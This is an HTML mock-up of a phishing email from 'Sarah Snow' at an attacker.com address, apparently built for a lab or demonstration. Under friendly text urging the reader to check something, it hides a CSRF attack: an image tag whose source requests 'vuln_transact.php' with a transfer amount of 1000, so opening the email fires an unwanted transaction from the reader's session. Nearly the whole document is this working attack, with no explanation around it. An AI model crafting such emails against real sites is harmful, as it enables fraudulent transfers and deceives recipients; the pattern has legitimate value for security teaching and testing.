<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Message from Sarah</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ddd;
            box-shadow: 2px 2px 10px rgba(0,0,0,0.1);
        }
        .email-header {
            background-color: #f2f2f2;
            padding: 10px;
        }
        .sender-name {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }
        .sender-email {
            font-size: 14px;
            color: #777;
        }
        .email-content {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="email-header">
        <span class="sender-name">Sarah Snow</span><br>
        <span class="sender-email">&lt;businessrival@attacker.com&gt;</span>
    </div>
    
    <div class="email-content">
        <h2>Urgent: Please Review This</h2>
        <p>Hey, I hope you're doing well! I need you to check something for me ASAP.</p>
        
        <!-- The hidden tracking / CSRF attack image -->
        <img src="vuln_transact.php?bId=22&amt=1000" alt="Loading...">
        
        <p>Let me know what you think. Thanks!</p>
        
        <p>Best, <br>Sarah</p>
    </div>
</body>
</html>
